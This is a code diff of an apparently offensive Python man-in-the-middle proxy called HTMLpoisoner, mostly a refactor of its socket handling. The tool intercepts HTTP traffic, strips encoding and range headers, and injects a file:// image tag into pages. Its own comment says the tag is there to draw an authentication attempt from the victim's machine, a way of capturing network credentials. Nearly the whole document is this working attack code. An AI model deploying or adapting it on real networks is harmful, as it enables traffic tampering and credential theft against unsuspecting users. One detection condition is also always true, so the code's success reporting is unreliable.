@@ -18,11 +18,11 @@
 HOST = "0.0.0.0"
 PORT = 3128
 VERBOSE = True
-TESTING = False
+TESTING = True
 VERBOSETESTING = False
 MAX_CONN = 50
 BUFFER_SIZE = 4096
-SOCKET_TIMEOUT = 1
+SOCKET_TIMEOUT = 2
 
 TESTING_FILE_RxRequest = 'HTMLpoisoner.clientreq.raw'
 TESTING_FILE_RxResponse = 'HTMLpoisoner.clientres.raw'
@@ -59,53 +59,32 @@ def connectionHandler(RxConnection, RxRequest, RxAddress, RxConnectionNum):
         TxConnectionString = getConnectionString(RxHeaders, RxConnectionNum, RxAddress[0])
         if TxConnectionString != False:
             TxRequest = weakenRequest(RxRequest, RxConnectionNum, RxAddress[0], RxHeaders['Host'])
+            writeRawData(TxRequest, TESTING_FILE_TxRequest, RxConnectionNum)
 
             # Connect to real web server
             TxSocket = createSocketTx(TxConnectionString, RxConnectionNum)
             # Send data to real web server if connection to server was possible
             if TxSocket != False:
                 TxSocket.send(TxRequest)
-                TxResponse = ''
-
-                while True:
-                    # get TxResponse response
-                    try:
-                        TxResponse += TxSocket.recv(BUFFER_SIZE)
-                        if VERBOSETESTING:
-                            print 'Data received from server (SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
-                        # if the response exists process it, otherwise don't
-                        if len(TxResponse) == 0:
-                            if TESTING:
-                                print 'Either null response or EOF from server detected' + ' (SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
-                            # break loop if EOF
-                            break
-                        else:
-                            # else process TxResponse
-                            if VERBOSETESTING:
-                                print 'Server sent ' + str(len(TxResponse)) + ' bytes (SrcAdd=' + RxAddress[0] + ' DstHost=' + RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
-                            # don't break here - there might be more data on its way
-                    except socket.timeout as errMsg:
-                        if str(errMsg) == 'timed out':
-                            if VERBOSE:
-                                print 'TxSocket timed out\n(SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
-                        else:
-                            print 'Looks like server closed connection before expected: ' + str(errMsg) + '\n(SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
-                        # break loop regardless of timeout or error
-                        break
-                    except socket.error as errMsg:
-                        print 'Socket error detected: ' + str(errMsg) + '\n(SrcAdd=' + RxAddress[0] + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
-                        # break loop if random error
-                        break
-
-                TxSocket.close()
-                RxResponse = weakenResponse(TxResponse, RxConnectionNum, RxAddress[0], RxHeaders['Host'])
-                try:
-                    RxConnection.send(RxResponse)
+                TxResponse = getTXResponse(TxSocket, RxAddress[0], RxHeaders['Host'], RxConnectionNum)
+                # check if there has been an error, if so, close victim's connection and terminate thread
+                if TxResponse == False:
                     RxConnection.close()
-                    if TESTING:
-                        print 'Server response sent to proxy client at: (SrcAdd=' + RxAddress[0] + ' DstHost=' + RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
-                except socket.error as errMsg:
-                    print 'Unknown RxResponse socket error: ' + str(errMsg) + '\n' + str(RxAddress) + ' (SrcAdd=' + RxAddress[0] + ' DstHost=' + RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
+                    return False
+                else:
+                    TxSocket.close()
+                    writeRawData(TxResponse, TESTING_FILE_TxResponse, RxConnectionNum)
+                    RxResponse = weakenResponse(TxResponse, RxConnectionNum, RxAddress[0], RxHeaders['Host'])
+                    writeRawData(RxResponse, TESTING_FILE_RxResponse, RxConnectionNum)
+                    try:
+                        RxConnection.send(RxResponse)
+                        RxConnection.close()
+                        if TESTING:
+                            print 'Server response sent to proxy client at: (SrcAdd=' + RxAddress[0] + ' DstHost=' + \
+                                  RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
+                    except socket.error as errMsg:
+                        print 'Unknown RxResponse socket error: ' + str(errMsg) + '\n' + str(RxAddress) + ' (SrcAdd=' + \
+                              RxAddress[0] + ' DstHost=' + RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
             elif TESTING:
                 print 'No TxSocket to work with'
         else:
@@ -114,21 +93,6 @@ def connectionHandler(RxConnection, RxRequest, RxAddress, RxConnectionNum):
                 print 'Incomplete connection string:\n' + str(TxConnectionString)
             RxConnection.close()
             return False
-
-
-def createSocketTx(connectionString, RxConnectionNum):
-    try:
-        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        ServerSocket.settimeout(SOCKET_TIMEOUT)
-        if VERBOSETESTING:
-            print "TxSocket build complete (" + connectionString['host'] + ":" + str(connectionString['port']) + ' RxConn=' + str(RxConnectionNum) + ')'
-        ServerSocket.connect((connectionString['host'], int(connectionString['port'])))
-        if VERBOSETESTING:
-            print "TxSocket connection complete (" + connectionString['host'] + ":" + str(connectionString['port']) + ' RxConn=' + str(RxConnectionNum) + ')'
-        return ServerSocket
-    except socket.error as errMsg:
-        print color('[!] Failed to connect to server') + '(' + connectionString['transport'] + "://" + connectionString['host'] + ":" + str(connectionString['port']) + "/" + connectionString['URI'] + ")\n" + str(errMsg) + ' (RxConn=' + str(RxConnectionNum) + ' RxConn=' + str(RxConnectionNum) + ')'
-        return False
 
 
 def createSocketRx(host, port):
@@ -151,6 +115,25 @@ def createSocketRx(host, port):
     return ServerSocket
 
 
+def createSocketTx(connectionString, RxConnectionNum):
+    try:
+        ServerSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        ServerSocket.settimeout(SOCKET_TIMEOUT)
+        if VERBOSETESTING:
+            print "TxSocket build complete (" + connectionString['host'] + ":" + str(
+                connectionString['port']) + ' RxConn=' + str(RxConnectionNum) + ')'
+        ServerSocket.connect((connectionString['host'], int(connectionString['port'])))
+        if VERBOSETESTING:
+            print "TxSocket connection complete (" + connectionString['host'] + ":" + str(
+                connectionString['port']) + ' RxConn=' + str(RxConnectionNum) + ')'
+        return ServerSocket
+    except socket.error as errMsg:
+        print color('[!] Failed to connect to server') + '(' + connectionString['transport'] + "://" + connectionString[
+            'host'] + ":" + str(connectionString['port']) + "/" + connectionString['URI'] + ")\n" + str(
+            errMsg) + ' (RxConn=' + str(RxConnectionNum) + ' RxConn=' + str(RxConnectionNum) + ')'
+        return False
+
+
 def getConnectionString(RxHeaders, RxConnectionNum, RxAddress):
     # Example HeaderOne value:
     # GET http://www.google.com:8080/path/to/resource/index.php?q=example HTTP/1.1
@@ -170,7 +153,8 @@ def getConnectionString(RxHeaders, RxConnectionNum, RxAddress):
                 # from example should result in: "www.google.com:8080"
                 hostAndPort = RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[0]
                 if VERBOSETESTING:
-                    print 'Host and Port: ' + hostAndPort + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
+                    print 'Host and Port: ' + hostAndPort + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(
+                        RxConnectionNum) + ')'
                 try:
                     # from example should result in: "8080" (do this first to trigger the except earlier)
                     port = hostAndPort.split(':')[1]
@@ -190,7 +174,8 @@ def getConnectionString(RxHeaders, RxConnectionNum, RxAddress):
                         print 'Port: ' + str(port) + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
                 URI = '/' + RxHeaders['Req'].split(' ')[1].split('://')[1].split('/', 1)[1]
                 if VERBOSETESTING:
-                    print 'URI: ' + URI + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
+                    print 'URI: ' + URI + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaders['Host'] + ' RxConn=' + str(
+                        RxConnectionNum) + ')'
             else:
                 # if this is triggered it means transparent proxy so have to make assumptions for below values
                 transport = 'http'
@@ -198,15 +183,19 @@ def getConnectionString(RxHeaders, RxConnectionNum, RxAddress):
                 port = 80
                 URI = RxHeaders['Req'].split(' ')[1]
                 if VERBOSETESTING:
-                    print 'Transport: ' + transport + '\nHost: ' + host + '\nPort: ' + str(port) + '\nURI: ' + URI + ' (SrcAdd=' + RxAddress + ' DstHost='+ RxHeaders['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
+                    print 'Transport: ' + transport + '\nHost: ' + host + '\nPort: ' + str(
+                        port) + '\nURI: ' + URI + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaders[
+                              'Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
 
         except IndexError as ErrMsg:
-            print 'RxHeaders issue detected: ' + str(ErrMsg) + "\n" + RxHeaders['Req'] + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
+            print 'RxHeaders issue detected: ' + str(ErrMsg) + "\n" + RxHeaders[
+                'Req'] + ' (SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
             sys.exit(2)
         connString = {'method': method, 'transport': transport, 'host': host, 'port': port, 'URI': URI}
         return connString
     else:
-        print 'Blank RxHeader["Req"] detected: ' + str(RxHeaders) + '(SrcAdd=' + RxAddress + ' RxConn=' + str(RxConnectionNum) + ')'
+        print 'Blank RxHeader["Req"] detected: ' + str(RxHeaders) + '(SrcAdd=' + RxAddress + ' RxConn=' + str(
+            RxConnectionNum) + ')'
     return False
 
 
@@ -223,13 +212,56 @@ def getHeaders(RxRequest, RxConnectionNum, RxAddress):
         for header in HTTPHeadersList:
             if headerIndex > 0:
                 headerParts = header.split(":", 1)
-                HTTPHeadersDict[headerParts[0]] = str(headerParts[1]).replace(' ','')
+                HTTPHeadersDict[headerParts[0]] = str(headerParts[1]).replace(' ', '')
             headerIndex += 1
         if VERBOSETESTING:
-            print str(HTTPHeadersDict) + ' (SrcAdd=' + RxAddress + ' DstHost='+ HTTPHeadersDict['Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
+            print str(HTTPHeadersDict) + ' (SrcAdd=' + RxAddress + ' DstHost=' + HTTPHeadersDict[
+                'Host'] + ' RxConn=' + str(RxConnectionNum) + ')'
         return HTTPHeadersDict
     except IndexError:
         return False
+
+
+def getTXResponse(TxSocket, RxAddress, RxHostHeader, RxConnectionNum):
+    TxResponse = ''
+    while True:
+        # get TxResponse response
+        try:
+            TxResponse += TxSocket.recv(BUFFER_SIZE)
+            if VERBOSETESTING:
+                print 'Data received from server (SrcAdd=' + RxAddress + ' DstHost=' + RxHostHeader + ' RxConn=' + str(
+                    RxConnectionNum) + ')'
+            # if the response exists process it, otherwise don't
+            if len(TxResponse) == 0:
+                if TESTING:
+                    print 'Either null response or EOF from server detected' + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHostHeader + ' RxConn=' + str(
+                        RxConnectionNum) + ')'
+                # break loop if EOF
+                break
+            else:
+                # else process TxResponse
+                if VERBOSETESTING:
+                    print 'Server sent ' + str(len(
+                        TxResponse)) + ' bytes (SrcAdd=' + RxAddress + ' DstHost=' + RxHostHeader + ' RxConn=' + str(
+                        RxConnectionNum) + ')'
+                    # don't break here - there might be more data on its way
+        except socket.timeout as errMsg:
+            if str(errMsg) == 'timed out':
+                if VERBOSE:
+                    print 'TxSocket timed out\n(SrcAdd=' + RxAddress + ' DstHost=' + RxHostHeader + ' RxConn=' + str(
+                        RxConnectionNum) + ')'
+                break
+            else:
+                print 'Looks like server closed connection before expected: ' + str(errMsg) + '\n(SrcAdd=' + \
+                      RxAddress + ' DstHost=' + RxHostHeader + ' RxConn=' + str(RxConnectionNum) + ')'
+                # return false if error (not timeout as this could just be the server behaving badly)
+                return False
+        except socket.error as errMsg:
+            print 'Socket error detected: ' + str(errMsg) + '\n(SrcAdd=' + RxAddress + ' DstHost=' + \
+                  RxHostHeader + ' RxConn=' + str(RxConnectionNum) + ')'
+            # break loop if random error
+            return False
+    return TxResponse
 
 
 # get the thing up and running
@@ -268,46 +300,54 @@ def sendBanner(connection, RxConnectionNum):
 
 
 def weakenRequest(RxRequest, RxConnectionNum, RxAddress, RxHeaderHost):
-#    RxRequest = re.sub(r'\r\nRange:.*\r\n', '\r\n', RxRequest)
-#    RxRequest = re.sub(r'\r\nIf-Range:.*\r\n', '\r\n', RxRequest)
     # Make sure the web server knows that encoding would cause us trouble by telling it that we don't want any
     TxRequest = re.sub(r'\r\nAccept-Encoding:.*\r\n', '\r\nAccept-Encoding: none\r\n', RxRequest)
     if VERBOSE and 'Accept-Encoding: none' in TxRequest:
-        print color('[*] Client request weakened', 3) + '\n(SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
+        print color('[*] Client request weakened',
+                    3) + '\n(SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
     elif VERBOSE:
-        print color('[!] Client request NOT weakened') + '\n(SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
+        print color(
+            '[!] Client request NOT weakened') + '\n(SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(
+            RxConnectionNum) + ')'
     if TESTING:
         print TxRequest + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
         writeRawData(TxRequest, TESTING_FILE_TxRequest, RxConnectionNum)
     return TxRequest
 
 
-def weakenResponse(TxResponse, RxConnectionNum, RxAddress, RxHeaderHost):  # Inject HTML tag into response to ellicit resource request (and therefore auth attempt) from client
-    # set up variable so multiple weakenings can be completed
+# Inject HTML tag into response to ellicit resource request (and therefore auth attempt) from client
+def weakenResponse(TxResponse, RxConnectionNum, RxAddress, RxHeaderHost):
+    # set up intermediate variable so multiple weakenings can be completed
     IntermediateResponse = TxResponse
     # Ranges cause problems when the MitM changes the content length - so disable them
     if 'Accept-Ranges:' in TxResponse:
-        IntermediateResponse = re.sub(r'\r\nAccept-Ranges:.*\r\n','\r\nAccept-Ranges: none\r\n',IntermediateResponse)
+        IntermediateResponse = re.sub(r'\r\nAccept-Ranges:.*\r\n', '\r\nAccept-Ranges: none\r\n', IntermediateResponse)
 
     # inject new tag if lowercase "<body>" tag is found
-    if  '</body>' in IntermediateResponse:
-        IntermediateResponse = IntermediateResponse.replace('</body>', '<img src="file://htmlinject/share/random.jpg" alt="" /></body>')
+    if '</body>' in IntermediateResponse:
+        IntermediateResponse = IntermediateResponse.replace('</body>',
+                                                            '<img src="file://htmlinject/share/random.jpg" alt="" /></body>')
     # inject new tag if uppercase "<body>" tag is found
     if '</BODY>' in IntermediateResponse:
-        IntermediateResponse = IntermediateResponse.replace('</BODY>', '<IMG SRC="file://htmlinject/share/random.jpg" ALT="" /></BODY>')
+        IntermediateResponse = IntermediateResponse.replace('</BODY>',
+                                                            '<IMG SRC="file://htmlinject/share/random.jpg" ALT="" /></BODY>')
 
     RxResponse = IntermediateResponse
 
     if '<img src="file://htmlinject/share/random.jpg" alt="" />' or '<IMG SRC="file://htmlinject/share/random.jpg" ALT="" />' in RxResponse:
         if VERBOSE:
-            print color('[*] HTML poisoning performed', 3) + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
+            print color('[*] HTML poisoning performed',
+                        3) + ' (SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(
+                RxConnectionNum) + ')'
         # Recalculate the size of the request as close as possible
         RxResponseNewLength = len(str(RxResponse)) + len(str(len(str(RxResponse))))
         # Insert new length into RxResponse
         RxResponse = re.sub(r'\r\nContent-Length:.*\r\n', '\r\nContent-Length: ' + str(RxResponseNewLength) + '\r\n',
                             RxResponse)
     elif TESTING:
-        print color('[!] No HTML poisoning achieved') + '\n(SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(RxConnectionNum) + ')'
+        print color(
+            '[!] No HTML poisoning achieved') + '\n(SrcAdd=' + RxAddress + ' DstHost=' + RxHeaderHost + ' RxConn=' + str(
+            RxConnectionNum) + ')'
         if VERBOSETESTING:
             print TxResponse
         writeRawData(RxResponse, TESTING_FILE_RxResponse, RxConnectionNum)
@@ -316,7 +356,8 @@ def weakenResponse(TxResponse, RxConnectionNum, RxAddress, RxHeaderHost):  # Inj
 
 def writeRawData(data, filename, RxConnectionNum):
     if VERBOSETESTING:
-        print 'Attempting to write raw data to disk (' + filename + ') for testing purposes' + ' (RxConn=' + str(RxConnectionNum) + ')'
+        print 'Attempting to write raw data to disk (' + filename + ') for testing purposes' + ' (RxConn=' + str(
+            RxConnectionNum) + ')'
     outputFile = open(filename, "ab")
     outputFile.write('\r\n\r\n(RxConn=' + str(RxConnectionNum) + ')\r\n' + data)
     outputFile.close()
